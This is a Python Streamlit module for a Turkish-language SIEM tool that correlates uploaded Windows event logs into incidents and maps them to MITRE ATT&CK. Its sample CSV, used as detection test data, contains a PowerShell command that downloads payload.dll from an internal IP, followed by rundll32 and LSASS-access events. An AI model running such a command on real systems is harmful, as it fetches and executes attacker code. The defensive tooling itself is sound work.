"""Toplu (CSV/JSON) analiz modu -- gercek SIEM mantigi (QRadar/Sentinel/
Splunk/Elastic): her satir ONCE bagimsiz olarak mevcut tekli-log pipeline'i
ile analiz edilir (app/batch/orchestrator.py -- birlestirilmis tek metin
DEGIL, satir basina bir LLM cagrisi), SONRA deterministik korelasyon motoru
(app/correlation/) satirlar arasi iliskiyi bulup incident'leri kurar. Iki
sekme: Bireysel Log Analizi (her satirin kendi sonucu) ve Incident Analizi
(korelasyon bulunan gruplar icin timeline/attack chain/risk skoru/ozet).
Iliskisiz loglar icin incident uydurulmaz -- yalnizca Bireysel sekmesinde
gorunurler."""

from __future__ import annotations

import json
from datetime import datetime

import pandas as pd
import streamlit as st

from app.batch.background_job import get_job, start_bulk_job
from app.batch.qradar_adapter import try_convert_qradar_export
from app.batch.serialize import (
    canonicalize_row,
    parse_csv_rows,
    parse_json_rows,
    rows_to_batch_items,
)
from app.correlation.dedup import confidence_threshold_sentence
from app.correlation.incident import rebuild_incident_presentation
from app.correlation.risk_score import THRESHOLD_SENTENCE, breakdown_sentences
from app.correlation.tactic_labels import tactic_label
from app.correlation.technique_narrative import technique_sentences
from app.enrichment import virustotal
from app.llm.bulk_chat_assistant import (
    CHAT_MODEL,
    SUGGESTED_QUESTIONS,
    NUM_CTX,
    actual_usage_warning,
    budget_status,
    build_bulk_chat_system_prompt,
    calibration_ratio,
    overflow_message,
    trim_history,
    wants_ioc,
)
from app.llm.ollama_client import chat_turn, usage_since, usage_snapshot
from app.mapping.coverage import build_coverage_report
from app.mapping.event_labels import event_label, required_sources_sentence
from app.mapping.text_input import text_to_row
from app.reporting.incident_report import IOC_CATEGORY_LABELS_TR, build_incident_report_markdown
from app.reporting.qradar_rule import build_incident_qradar_rule
from app.ui.diagrams import build_attack_chain_diagram, build_timeline_diagram, format_timestamp
from app.ui.render import render_result
from app.ui.theme import SEVERITY_COLOR, confidence_badge, md_badge, section

SEVERITY_LABEL_TR = {"Low": "Düşük", "Medium": "Orta", "High": "Yüksek", "Critical": "Kritik"}
CONFIDENCE_LABEL_TR = {"high": "yüksek", "medium": "orta", "low": "düşük", "insufficient": "yetersiz"}

# Korelasyon motorunun tanidigi kolonlarin bir alt kumesi -- tam alias listesi
# app/batch/serialize.py CANONICAL_FIELD_ALIASES'te. CSV bunlarin disinda
# kolon da icerebilir (LLM analizine gecer, sadece korelasyonda kullanilmaz).
SAMPLE_CSV = """Timestamp,EventID,Hostname,SubjectUserName,ServiceName,CommandLine,NewProcessName,TargetFilename,TargetImage,ShareName
2026-08-06 09:21:06,5140,FS-01,svc_backup,,,,,,ADMIN$
2026-08-06 09:21:14,7045,FS-01,svc_backup,UpdaterSvc,,,,,
2026-08-06 09:24:27,4104,FS-01,svc_backup,,"powershell.exe -Command (New-Object Net.WebClient).DownloadFile('http://10.10.20.15/payload.dll','C:\\Windows\\Temp\\payload.dll')",,,,
2026-08-06 09:24:29,4688,FS-01,svc_backup,,,rundll32.exe,,,
2026-08-06 09:25:12,10,FS-01,svc_backup,,,,,C:\\Windows\\System32\\lsass.exe,
2026-08-06 11:40:00,4624,OTHER-HOST,unrelated_user,,,,,,
"""


def _render_csv_format_help() -> None:
    with st.expander("Beklenen CSV formatı / örnek şablon", expanded=False):
        st.markdown(
            "Her **satır bir log olayı**. Kolon adları serbest -- yaygın Sysmon/Windows Event Log "
            "eş anlamlıları otomatik tanınır (örn. `Computer` da `SourceAddress` da kabul edilir). "
            "Korelasyon motoru şu alanları arıyor (bulduklarını kullanır, hiçbiri zorunlu değil):"
        )
        st.write(
            "`Timestamp`, `EventID`, `Hostname`/`Computer`, `SubjectUserName`/`User`, "
            "`SourceIp`/`SrcIP`, `DestinationIp`/`DstIP`, `ProcessGuid`, `ParentProcessGuid`, "
            "`ProcessId`/`PID`, `ParentProcessId`/`PPID`, `LogonId`, `SessionId`, `ServiceName`, "
            "`FilePath`/`TargetFilename`, `NewProcessName`/`ProcessName`/`Image`, `CommandLine`"
        )
        st.caption(
            "İki log arasında bu alanlardan herhangi biri aynı değere sahipse (ve 24 saat içindeyse) "
            "'ilişkili' sayılıp aynı incident'e girerler. Değeri boş bırakılan hücreler sorun değil."
        )
        st.write("**Örnek CSV** (ADMIN$ erişimi → servis kurulumu → PowerShell indirme → rundll32 → LSASS erişimi zinciri + ilişkisiz bir satır):")
        st.code(SAMPLE_CSV, language=None)
        st.download_button("Örnek CSV'yi indir", data=SAMPLE_CSV, file_name="ornek_incident.csv", mime="text/csv")


def _parse_precomputed_result(file_bytes: bytes) -> dict:
    """scripts/run_bulk_analysis.py'nin ürettiği JSON'u yükler.

    O script, sonucu json.dumps(..., default=str) ile yazdığı için timestamp
    alanları datetime yerine string olarak geliyor -- format_timestamp gibi
    render kodu datetime bekliyor, bu yüzden burada geri çeviriyoruz."""
    data = json.loads(file_bytes.decode("utf-8"))
    for item in data.get("items", []):
        if isinstance(item.get("timestamp"), str):
            item["timestamp"] = datetime.fromisoformat(item["timestamp"])
    for incident in data.get("incidents", []):
        for entry in incident.get("timeline", []):
            if isinstance(entry.get("timestamp"), str):
                entry["timestamp"] = datetime.fromisoformat(entry["timestamp"])
    # Dosyaya yazilmis timeline/attack_chain/risk/ozet, dosyanin uretildigi
    # TARIHTEKI mantigi tasiyor. Sunum katmanini kayitli veriden yeniden
    # turetiyoruz ki eski kosular da guncel gorunumle acilsin -- items da
    # veriliyor, boylece kanit metinleri yeniden secilir (bkz.
    # app/correlation/incident.py::rebuild_incident_presentation).
    items = data.get("items", [])
    data["incidents"] = [
        rebuild_incident_presentation(inc, items) for inc in data.get("incidents", [])
    ]
    return data


def _render_precomputed_result_loader() -> None:
    with st.expander("Önceden hesaplanmış sonucu yükle (`scripts/run_bulk_analysis.py`)", expanded=False):
        st.caption(
            "Uzun sürebilecek çoklu log analizlerini tarayıcı bağlantısından bağımsız çalıştırmak için "
            "terminalde `python scripts/run_bulk_analysis.py loglar.csv --out sonuc.json` komutunu "
            "çalıştırabilirsin. Ürettiği sonuç dosyasını burada yükleyip aynı görünümle inceleyebilirsin."
        )
        result_file = st.file_uploader("Sonuç JSON dosyası", type=["json"], key="precomputed_result_upload")
        if result_file and st.button("Sonucu yükle"):
            try:
                st.session_state["last_bulk_result"] = _parse_precomputed_result(result_file.getvalue())
                st.success("Sonuç yüklendi.")
            except Exception as e:
                st.error(f"Sonuç dosyası okunamadı: {e}")


def _top_mapping(analysis: dict | None) -> dict | None:
    if not analysis:
        return None
    mappings = analysis.get("mappings") or []
    return max(mappings, key=lambda m: m.get("confidence_score") or 0.0) if mappings else None


def _render_individual_tab(items: list[dict], incident_by_row: dict[int, str]) -> None:
    # Ozet tablo ONCE: 51 satirlik bir dosyada kartlari tek tek kaydirmadan
    # hangi satirin neye eslestigi tek bakista gorunur.
    ozet = []
    for item in items:
        if item["skipped"]:
            continue
        top = _top_mapping(item.get("analysis"))
        ozet.append({
            "Satır": item["index"] + 1,
            "En güçlü teknik": f"{top.get('attack_id')} — {top.get('name')}" if top else "—",
            "Güven": CONFIDENCE_LABEL_TR.get(top.get("confidence_level"), top.get("confidence_level")) if top else "—",
            "Incident": incident_by_row.get(item["index"], "—"),
            "Durum": "hata" if item.get("analysis_error") else "tamam",
        })
    if ozet:
        st.dataframe(pd.DataFrame(ozet), hide_index=True, width="stretch")

    for item in items:
        if item["skipped"]:
            continue
        top = _top_mapping(item.get("analysis"))
        confidence = top.get("confidence_level") if top else None

        with st.container(border=True):
            baslik = f"**Satır {item['index'] + 1}**"
            if item["index"] in incident_by_row:
                baslik += f"&nbsp; {md_badge(incident_by_row[item['index']], 'blue')}"
            if top:
                baslik += f"&nbsp; {confidence_badge(confidence)}"
            st.markdown(baslik)

            if item.get("analysis_error"):
                st.error(f"Bu satır analiz edilemedi: {item['analysis_error']}")

            st.caption("Ham log")
            st.code(item["raw_log"], language=None)

            sol, sag = st.columns(2, gap="large")
            mappings = (item.get("analysis") or {}).get("mappings") or []
            with sol:
                st.markdown("**MITRE eşleştirmeleri**")
                if mappings:
                    for m in mappings:
                        st.markdown(
                            f"{confidence_badge(m.get('confidence_level'))}&nbsp; "
                            f"`{m.get('attack_id')}` {m.get('name')}"
                        )
                else:
                    st.caption("Güvenilir bir eşleştirme bulunamadı.")
            with sag:
                st.markdown("**Kanıt**")
                if top and top.get("evidence"):
                    for e in top["evidence"]:
                        st.write(f"- {e}")
                else:
                    st.caption("—")

            # Bilerek expander DEGIL: Streamlit expander'in icerigini kapaliyken
            # de calistiriyor. Burasi satir basina tam bir sonuc ekrani cizdigi
            # icin 51 satirlik bir dosyada kullanici hicbir detayi acmasa bile
            # 51 kez tum render maliyeti odeniyordu -- satirlarin tek tek
            # dusmesinin ve incident sekmesine sira gelmemesinin sebebi buydu.
            # Toggle ile icerik yalnizca acikken calisiyor.
            if item.get("analysis"):
                if st.toggle("Tam detay", key=f"bulk_detail_{item['index']}"):
                    render_result(item["analysis"])
            else:
                st.caption("Analiz sonucu yok.")


def _vt_state_key(incident: dict) -> str:
    return f"vt_lookup_{incident['id']}"


def _render_ip_reputation(incident: dict, ioc: dict) -> None:
    """IOC'lerdeki IP'leri VirusTotal'de sorgular.

    Sorgu bilerek BUTONA bagli: dis bir servise veri gonderen bir islem her
    ekran cizilisinde kendiliginden tetiklenmemeli. Sonuc session_state'te
    tutulur, boylece Streamlit'in her etkilesimde sayfayi yeniden calistirmasi
    ayni IP'yi tekrar sorgulamaya yol acmaz."""
    ips = [i["value"] for i in ioc.get("ioc_list", []) if i.get("type") == "ip"]
    if not ips:
        return

    state_key = _vt_state_key(incident)
    lookup = st.session_state.get(state_key)

    with st.expander(f"IP itibar kontrolü — VirusTotal ({len(ips)} IP)"):
        if not virustotal.is_enabled():
            st.info(
                "VirusTotal sorgusu kapalı: `.env` dosyasına `VIRUSTOTAL_API_KEY` "
                "eklenince bu bölüm etkinleşir. Analizin geri kalanı bundan etkilenmez."
            )
            return

        st.caption(
            "Yalnızca public IP'ler gönderilir; özel/iç ağ adresleri (10.x, 192.168.x, "
            "172.16-31.x, 127.x) kasıtlı olarak gönderilmez. Sonuçlar yalnızca "
            "bilgilendirme amaçlıdır — ATT&CK eşleştirmesine dahil edilmez."
        )

        if st.button("VirusTotal'de sorgula", key=f"vt_btn_{incident['id']}"):
            with st.spinner("VirusTotal sorgulanıyor..."):
                lookup = virustotal.lookup_ips(ips)
            st.session_state[state_key] = lookup

        if lookup is None:
            return

        if lookup.reputations:
            st.dataframe(
                [
                    {
                        "IP": r.ip, "Sonuç": r.verdict, "Zararlı": r.malicious,
                        "Şüpheli": r.suspicious, "Zararsız": r.harmless,
                        "Ülke": r.country or "-", "AS": r.as_owner or "-",
                    }
                    for r in lookup.reputations
                ],
                hide_index=True,
            )
        else:
            st.write("Sorgulanabilecek public IP bulunamadı.")

        if lookup.skipped_private:
            st.caption(
                f"Gönderilmeyen özel/iç ağ adresleri ({len(lookup.skipped_private)}): "
                + ", ".join(lookup.skipped_private)
            )
        if lookup.skipped_over_limit:
            st.warning(
                f"Kota nedeniyle sorgulanamayan ({len(lookup.skipped_over_limit)}): "
                + ", ".join(lookup.skipped_over_limit)
            )


def _render_risk_breakdown(risk: dict, technique_count: int | None = None) -> None:
    """Skorun gerekcesini okunur bir tabloya cevirir.

    Onceki hali ham JSON'du ({'tactic_coverage': 22.0, ...}); sonra Turkce
    ETIKET aldi ama sayinin NEREDEN geldigi hala yazmiyordu -- "taktik
    kapsami 4.0" analiste hicbir sey soylemiyor. Gorev 25: her bilesenin
    yaninda o sayiyi ureten gerekce duruyor.

    HICBIR SEY YENIDEN HESAPLANMIYOR: sutunlardaki katkilar breakdown
    sozlugundeki degerlerin ta kendisi (bkz. app/correlation/risk_score.py
    ::breakdown_sentences ve tests/test_risk_breakdown_sentences.py)."""
    rows = breakdown_sentences(risk, technique_count=technique_count)
    st.dataframe(
        pd.DataFrame(
            [{"Bileşen": ad, "Neden bu sayı?": gerekce, "Katkı": katki} for ad, gerekce, katki in rows]
        ),
        hide_index=True,
        width="stretch",
    )
    st.markdown(
        f"**Toplam: {risk['score']}/100 — "
        f"{SEVERITY_LABEL_TR.get(risk['severity'], risk['severity'])}**\n\n"
        f"{THRESHOLD_SENTENCE}"
    )
    st.caption(
        "Skor kural tabanlıdır, dil modeli kullanılmaz. Bileşenlerin tavanı sırasıyla "
        "30 / 30 / 20 / 20'dir; toplam 100 üzerinden yuvarlanır."
    )


def _render_weak_signals(incident: dict, sentences: dict[str, str] | None = None) -> None:
    """Dusuk guvenli teknikler -- anlatidan ayri ama GORUNUR.

    Bunlar zincire, ozete ve risk skoruna girmiyor (bkz. app/correlation/
    dedup.py::split_by_confidence). Silinmiyor olmalari onemli: 'neden bu
    teknigi atladin?' sorusunun cevabi ekranda durmali."""
    weak = incident.get("weak_techniques") or []
    if not weak:
        return

    with st.expander(f"Doğrulama gerektiren zayıf sinyaller ({len(weak)})"):
        st.caption(
            "Bu teknikler tek kanıta dayandığı veya güven skoru düşük kaldığı için saldırı "
            "zincirine, analist özetine ve risk skoruna **dahil edilmedi**. Elenmediler — "
            "bir analistin doğrulaması için burada listeleniyorlar."
        )
        sentences = sentences or {}
        st.dataframe(
            pd.DataFrame([
                {
                    "ATT&CK ID": t["attack_id"],
                    "Teknik": t["name"],
                    "Ne oldu?": sentences.get(t["attack_id"], "-"),
                    "Taktikler": ", ".join(tactic_label(x, with_english=False) for x in t["tactics"]),
                    "Güven": t.get("confidence_level") or "-",
                    "Skor": round(t.get("max_confidence_score") or 0.0, 2),
                    "Kayıt": t["occurrence_count"],
                }
                for t in weak
            ]),
            hide_index=True,
            width="stretch",
        )


def _render_incident_qradar_rule(incident: dict, rows_by_index: dict[int, dict]) -> None:
    """Incident'in tamamindan turetilen korelasyonlu taslak kural.

    Tekli log kuralindan farki: tek bir olaya degil, ayni makinede/kullanicida
    ayni zaman penceresinde gorulen BIRDEN FAZLA asamaya bakiyor. Yanlis
    pozitifi dusuren sey de bu esik."""
    draft = build_incident_qradar_rule(incident, rows_by_index)
    if draft is None:
        st.caption(
            "Bu incident için korelasyon kuralı üretilmedi (örneğin tek teknikli bir "
            "incident'te kural kurulmaz)."
        )
        return

    with st.container():
        st.caption(
            "Bu kural **kod tarafında** üretildi — LLM'e QRadar sözdizimi yazdırılmıyor. "
            "Teknikler doğrulama katmanından geçmiş güçlü bulgulardan, alanlar ise ham "
            "log satırlarından geliyor."
        )
        st.code(draft["rule_text"], language="text")

        st.write("**Kuralın dayandığı teknikler:**")
        for line in draft["techniques"]:
            st.write(line)

        st.write("**Notlar:**")
        for note in draft["notes"]:
            st.write(f"- {note}")


def event_labels_lines(event_ids) -> list[str]:
    """Olay ID'lerini 'ID (adi) — gerekli log kaynagi' satirlarina cevirir.

    Analist ID'leri ezbere bilmez; ad `config/event_semantics.yaml`ten,
    kaynak `config/log_sources.yaml`ten gelir. Adi bilinmeyen ID ciplak
    kalir (uydurma ad basilmaz)."""
    from app.mapping.event_labels import log_source

    return [f"`{event_label(e)}` — {log_source(e)}" for e in event_ids]


def build_items_coverage_report(items: list[dict]):
    """Kapsam raporu: hem 'Tespit Kapsami' sekmesi hem sohbet baglami
    kullaniyor. Iki kez kurmak ayni hesabi iki kez yapmak olurdu."""
    return build_coverage_report([canonicalize_row(it["source_row"]) for it in items])


def _render_coverage_tab(items: list[dict], report=None) -> None:
    """Tespit boslugu beyani: veri setinde HANGI olay ID'leri YOK ve bu
    hangi taktikleri degerlendirilemez kiliyor.

    Neden ayri bir sekme: "Persistence taktiginde bulgu yok" ile "Persistence
    taktigini degerlendirecek veri yok" bambaska iki ifadedir. Ilki bir
    tespit sonucu, ikincisi bir KORLUK beyani. Ikisi ayni ekranda ayni
    gorunurse rapor, bakmadigi yeri temiz ilan etmis olur -- SOC icin bu
    dogrudan log kaynagi eksigi demek."""
    if report is None:
        report = build_items_coverage_report(items)

    st.markdown("#### Tespit kapsamı")
    st.caption(
        "Kapsam, kural kataloğundan (`rules/attack_mappings.yaml`) **türetilir**: her kuralın "
        "zorunlu olay ID'leri, o kuralın taktiği için 'bu taktiği görebileceğimiz olaylar' "
        "kümesini oluşturur. Kataloğa yeni kural eklendiğinde bu tablo kendiliğinden güncellenir."
    )

    if not report.dataset_event_ids:
        st.warning(
            "Veri setinde hiç olay ID'si (EventID) bulunamadı — kapsam analizi yapılamıyor. "
            "CSV'nizde `EventID` (veya `event_id`) kolonu var mı?"
        )
        return

    st.write("**Veri setindeki olay ID'leri:**")
    for line in event_labels_lines(report.dataset_event_ids):
        st.write(f"- {line}")

    unassessable = report.unassessable
    if unassessable:
        st.error(f"**{len(unassessable)} taktik değerlendirilemedi — bu bir tespit boşluğudur.**")
        st.dataframe(
            pd.DataFrame([
                {
                    "Taktik": t.tactic_name or t.tactic,
                    "Eksik Olay ID'leri": ", ".join(event_label(e) for e in t.missing_event_ids),
                    "Ne yapmalıyım?": required_sources_sentence(t.missing_event_ids),
                }
                for t in unassessable
            ]),
            hide_index=True,
            width="stretch",
        )
        st.caption(
            "Bu taktikler hakkında **hiçbir şey söylenemez** — bulgu olmaması temiz olduğu "
            "anlamına gelmez, sadece bakılamadığı anlamına gelir. 'Ne yapmalıyım?' sütunu "
            "eksik ID'leri toplayan log kaynağını söyler (`config/log_sources.yaml`); o "
            "kaynağın devrede olup olmadığını kontrol edin. Adı yazmayan ID'ler "
            "`config/event_semantics.yaml` kataloğunda yoktur."
        )
    else:
        st.success("Kural kataloğundaki her taktik için en az bir ilgili olay ID'si veri setinde mevcut.")

    with st.expander(f"Değerlendirilebilen taktikler ({len(report.assessable)})"):
        st.dataframe(
            pd.DataFrame([
                {
                    "Taktik": t.tactic_name or t.tactic,
                    "Mevcut Olay ID'leri": ", ".join(event_label(e) for e in t.present_event_ids),
                    "Eksik (kısmi)": ", ".join(event_label(e) for e in t.missing_event_ids) or "-",
                }
                for t in report.assessable
            ]),
            hide_index=True,
            width="stretch",
        )


def _chat_state_key(incident: dict) -> str:
    """Sohbet gecmisi INCIDENT'A BAGLI.

    Toplu modda N incident var; tek bir gecmis paylasilsaydi "risk neden
    26" hangi incident'in sorusu belirsiz olurdu ve model yanlis
    baglamdan cevaplardi."""
    return f"bulk_chat_{incident['id']}"


def _render_incident_chat(incident: dict, parsed_rows: dict[int, dict], coverage_report) -> None:
    """Incident verisi uzerinde VERI SORGUSU sohbeti.

    Tekli moddaki sohbetin kopyasi DEGIL: oradaki sorular "bu teknik neden
    secildi" (aciklama), buradakiler "hangi satirlardan geldi", "risk neden
    26" (veri sorgusu). Cevaplar zaten veride; model hesaplamaz, ALINTILAR
    -- baglamdaki risk bolumu breakdown_sentences ciktisidir.

    TASMA SESSIZ DEGIL (madde 16): Ollama num_ctx'i asan prompt'u sessizce
    kirpar. Gonderimden ONCE tahmin edilip asiyorsa cagri HIC YAPILMAZ;
    gonderimden SONRA Ollama'nin dondurdugu GERCEK sayi (usage_since)
    kontrol edilir."""
    state_key = _chat_state_key(incident)
    history = st.session_state.setdefault(state_key, [])

    with st.container():
        st.markdown(f"**{incident['id']} hakkında soru sorun**")
        st.caption(
            "Bu sohbet **yalnızca yukarıdaki toplu analiz sonucuna** dayanır — yeni bir "
            "ATT&CK eşleştirmesi yapmaz, yeni teknik önermez, risk skorunu yeniden "
            "hesaplamaz. Sayılar bağlama zaten hesaplanmış girer; modelin işi bulmak, "
            "hesaplamak değil."
        )

        pending_key = f"{state_key}_pending"
        cols = st.columns(len(SUGGESTED_QUESTIONS))
        for col, question in zip(cols, SUGGESTED_QUESTIONS):
            if col.button(question, key=f"{state_key}_sug_{question}", width="stretch"):
                st.session_state[pending_key] = question

        for msg in history:
            with st.chat_message(msg["role"]):
                st.write(msg["content"])

        typed = st.chat_input(
            "Örnek: T1205.002 hangi satırlardan geldi? / 11:28'de ne oldu?",
            key=f"{state_key}_input",
        )
        user_question = typed or st.session_state.pop(pending_key, None)

        if history and st.button("Sohbeti temizle", key=f"{state_key}_clear"):
            st.session_state[state_key] = []
            st.session_state.pop(f"{state_key}_cal", None)
            st.rerun()

        if not user_question:
            return

        # IOC "sorulunca" -- IKINCI LLM TURU YOK. Soru IOC'yle ilgiliyse
        # IOC ozeti baglama eklenir ve YER ACMAK icin zaman cizelgesi ayni
        # turda cikarilir. Ikinci tur sureyi ikiye katlardi.
        ioc_turn = wants_ioc(user_question)
        system_prompt = build_bulk_chat_system_prompt(
            incident, parsed_rows, coverage_report, include_ioc=ioc_turn
        )

        history.append({"role": "user", "content": user_question})
        with st.chat_message("user"):
            st.write(user_question)

        # Kalibrasyon: onceki cagrinin GERCEK token sayisindan olculen oran.
        # Ilk turda yok (sabit, temkinli oran kullanilir); ikinci turdan
        # itibaren tahminci gercege oturur ve yanlis alarm vermez.
        cal = st.session_state.get(f"{state_key}_cal")
        # Bagimsiz veri sorgulari: eski turlar cevabi etkilemiyor ve
        # pencerede yer kapliyor. Dusen tur SESSIZ DEGIL, asagida yaziliyor.
        gonderilecek, dusen = trim_history(history, system_prompt, chars_per_token=cal)
        status = budget_status(system_prompt, gonderilecek, chars_per_token=cal)
        if not status["fits"]:
            # Cagri YAPILMIYOR: model baglamin bir kismini sessizce
            # kaybederdi ve bunu kimse fark etmezdi.
            history.pop()
            st.warning(overflow_message(status))
            return

        with st.chat_message("assistant"):
            with st.spinner("Yanıt hazırlanıyor..."):
                before = usage_snapshot()
                try:
                    reply = chat_turn(CHAT_MODEL, system_prompt, gonderilecek)
                except Exception as e:
                    history.pop()
                    st.error(f"Yanıt alınamadı: {e}")
                    return
                spent = usage_since(before)

            # Gonderilen metnin GERCEK orani bir dahaki tura tasiniyor.
            sent_text = system_prompt + "".join(m.get("content") or "" for m in gonderilecek)
            ratio = calibration_ratio(sent_text, spent["prompt_tokens"])
            if ratio is not None:
                st.session_state[f"{state_key}_cal"] = ratio

            st.write(reply)
            if dusen:
                st.caption(
                    f"Pencereye sığması için **en eski {dusen} mesaj** bu soruda "
                    "modele gönderilmedi (ekranda duruyorlar). Bu sorular bağımsız veri "
                    "sorgularıdır; eski turlar cevabı etkilemez."
                )
            if ioc_turn:
                st.caption(
                    "Bu soru IOC ile ilgili olduğu için IOC özeti bağlama eklendi ve "
                    "yer açmak üzere **zaman çizelgesi bu turda çıkarıldı**."
                )
            st.caption(
                f"Bağlam ~{status['total']} token "
                f"({'kalibre' if status['calibrated'] else 'ilk tur, temkinli'} tahmin) · "
                f"gerçek gönderilen: {spent['prompt_tokens']} / {NUM_CTX}"
            )

        # GERCEK sayi: tahminci yaniliyorsa burada yakalanir.
        warning = actual_usage_warning(spent["prompt_tokens"])
        if warning:
            st.warning(warning)

        history.append({"role": "assistant", "content": reply})


def _render_incident_tab(
    incidents: list[dict],
    rows_by_index: dict[int, dict],
    parsed_rows: dict[int, dict] | None = None,
    coverage_report=None,
) -> None:
    if not incidents:
        st.info(
            "Yüklenen loglar arasında birbirleriyle ilişkili (aynı Hostname/Kullanıcı/IP/"
            "ProcessGuid/LogonId/... paylaşan) bir grup bulunamadı -- incident oluşturulmadı. "
            "Sonuçlar için 'Bireysel Log Analizi' sekmesine bakın."
        )
        return

    parsed_rows = parsed_rows or {}

    for incident in incidents:
        risk = incident["risk"]
        severity_tr = SEVERITY_LABEL_TR.get(risk["severity"], risk["severity"])
        # 'techniques' = yalnizca GUCLU (dogrulanmis) teknikler; zayiflar
        # 'weak_techniques'te ayri durur (app/correlation/incident.py).
        # Eski kayitli sonuclarda anahtar YOKSA deduped'a duseriz. `or` ile
        # yazilmisti ve BOS liste de dusuyordu: 0 guclu + 10 zayif teknikli bir
        # incident "Dogrulanmis teknik: 10" gosteriyordu. Bos liste 0'dir.
        if "techniques" in incident:
            techniques = incident["techniques"] or []
        else:
            techniques = incident["deduped_techniques"]
        weak_techniques = incident.get("weak_techniques") or []
        # Teknik basina "ne oldu" cumlesi; kurulamayan teknik sozlukte YOK.
        sentences = technique_sentences(
            list(techniques) + list(weak_techniques), parsed_rows
        )

        with st.container(border=True):
            head_l, head_r = st.columns([3, 1], vertical_alignment="center")
            siddet_rozeti = md_badge(
                f"{severity_tr} · {risk['score']}/100", SEVERITY_COLOR.get(risk["severity"], "gray")
            )
            head_l.markdown(f"### {incident['id']}&nbsp; {siddet_rozeti}")
            head_l.caption(
                f"Sunucu: {incident['hostname'] or '-'} · Kullanıcı: {incident['primary_user'] or '-'}"
            )
            with head_r:
                # VT sorgusu yapildiysa rapora da girsin; yapilmadiysa ip_lookup
                # None kalir ve rapor eskisi gibi uretilir.
                st.download_button(
                    "Raporu indir (.md)",
                    data=build_incident_report_markdown(
                        incident, ip_lookup=st.session_state.get(_vt_state_key(incident))
                    ),
                    file_name=f"{incident['id']}_rapor.md",
                    mime="text/markdown",
                    key=f"download_report_{incident['id']}",
                    icon=":material/download:",
                    width="stretch",
                )

            m1, m2, m3, m4, m5 = st.columns(5)
            m1.metric("Risk skoru", f"{risk['score']}/100", border=True)
            m2.metric("Log kaydı", len(incident["row_indices"]), border=True)
            m3.metric(
                "Doğrulanmış teknik", len(techniques), border=True,
                help="Yalnızca kanıt düzeyi yeterli (güçlü) teknikler; zincire, özete ve risk skoruna bunlar girer.",
            )
            m4.metric(
                "Zayıf sinyal", len(weak_techniques), border=True,
                help="Doğrulama gerektiren düşük güvenli teknikler — Matris sekmesinde ayrıca listelenir.",
            )
            m5.metric("Taktik aşaması", len(incident["attack_chain"]), border=True)

            # Analist ozeti EN USTE: rapora bakan kisinin ilk gormesi gereken
            # sey olayin ne oldugu; diyagramlar ve tablolar bunun kanitlari.
            section("Analist özeti")
            st.info(incident["attack_summary"])

            (t_zaman, t_zincir, t_matris, t_risk, t_ioc, t_kural, t_sohbet) = st.tabs(
                ["Zaman çizelgesi", "Saldırı zinciri", "Matris", "Risk", "IOC ve itibar",
                 "QRadar kuralı", "Sohbet"]
            )

        with t_risk:
            _render_risk_breakdown(risk, technique_count=len(techniques))

        with t_zaman:
            timeline = incident["timeline"]
            timeline_diagram = build_timeline_diagram(timeline)
            if timeline_diagram:
                st.mermaid_chart(timeline_diagram)
                # Diyagramdaki kanit metinleri sigmasi icin kisaltiliyor --
                # tam hali burada duruyor.
                with st.expander("Zaman çizelgesi — tam kanıt metinleri"):
                    for entry in timeline:
                        st.write(
                            f"`{format_timestamp(entry['timestamp'])}`  "
                            f"EventID={entry['event_id'] or '-'}  —  {entry['evidence']}"
                        )
            else:
                st.caption("Zaman çizelgesi kurulamadı.")

        with t_zincir:
            chain = incident["attack_chain"]
            chain_diagram = build_attack_chain_diagram(chain)
            if chain_diagram:
                st.mermaid_chart(chain_diagram)
                st.caption(
                    "Her teknik, kill chain sırasındaki **birincil** taktiğinde bir kez çizilir; "
                    "tekniğin diğer taktikleri Matris sekmesinde görünür."
                )
            else:
                st.caption("Saldırı zinciri kurulamadı.")

        with t_matris:
            st.caption("MITRE matrisi (tekilleştirilmiş)")
            matrix_rows = [
                {
                    "ATT&CK ID": t["attack_id"],
                    "Teknik": t["name"],
                    "Ne oldu?": sentences.get(t["attack_id"], "-"),
                    "Taktikler": ", ".join(tactic_label(x, with_english=False) for x in t["tactics"]),
                    "Güven": t.get("confidence_level") or "-",
                    "Kayıt Sayısı": t["occurrence_count"],
                }
                for t in techniques
            ]
            if matrix_rows:
                st.dataframe(pd.DataFrame(matrix_rows), hide_index=True, width="stretch")
                st.caption(
                    "'Ne oldu?' sütunu tekniğin İLK görüldüğü log kaydından, o olay türü için "
                    "anlamlı sayılan alanlardan kurulur (`config/event_semantics.yaml`) — "
                    "dil modeli kullanılmaz. Olayı katalogda olmayan kayıtlarda `-` kalır; "
                    "tam kanıt metni Zaman çizelgesi sekmesindedir."
                )
            else:
                st.caption("Doğrulanmış teknik yok.")

            # 3. madde: "kanit duzeyi yeterli" ne demek -- esik EKRANDA.
            st.caption(confidence_threshold_sentence())

            _render_weak_signals(incident, sentences)

        with t_kural:
            _render_incident_qradar_rule(incident, rows_by_index)

        with t_sohbet:
            _render_incident_chat(incident, parsed_rows, coverage_report)

        with t_ioc:
            ioc = incident["ioc_summary"]
            _render_ip_reputation(incident, ioc)
            with st.expander("IOC / artefakt özeti", expanded=True):
                st.write("**IOC Listesi:**")
                st.write(", ".join(f"{i['type']}:{i['value']}" for i in ioc["ioc_list"]) or "-")
                for label, key in IOC_CATEGORY_LABELS_TR:
                    st.write(f"**{label}:** {len(ioc[key])}")
                    if ioc[key]:
                        st.json(ioc[key])


@st.fragment(run_every=2)
def _render_running_job(job_id: str) -> None:
    """Calisan isin ilerlemesini 2 saniyede bir tazeler.

    Fragment kullanmanin sebebi: ilerlemeyi gostermek icin butun sayfayi
    yeniden calistirmak gerekmiyor -- yalnizca bu kucuk parca yenileniyor.
    Isin kendisi zaten baska bir thread'de donuyor, burasi sadece OKUYOR."""
    job = get_job(job_id)
    if job is None:
        return

    if job.status != "running":
        # Is bitti: tum sayfayi yenile ki sonuc bolumu cizilsin.
        st.rerun()

    ratio = job.current / job.total if job.total else 0.0
    if job.phase == "yeniden_deneme":
        text = f"Başarısız satırlar yeniden deneniyor: {job.current}/{job.total}"
    else:
        text = f"Satır {job.current}/{job.total} analiz ediliyor... (yerel LLM nedeniyle uzun sürebilir)"
    st.progress(ratio, text=text)
    st.caption(
        "Analiz **arka planda** çalışıyor — başka sekmeye geçebilir, pencereyi küçültebilir "
        "veya sayfayı yenileyebilirsin. İş, tarayıcı bağlantısından bağımsız devam eder ve "
        "biter bitmez sonuç diske yazılır. (Uygulamayı terminalden kapatırsan iş de durur.)"
    )


def _render_job_status() -> None:
    """Arka plan isinin durumunu arayuze yansitir; bitmisse sonucu devralir."""
    job = get_job(st.session_state.get("bulk_job_id"))
    if job is None:
        return

    if job.status == "running":
        _render_running_job(job.id)
        return

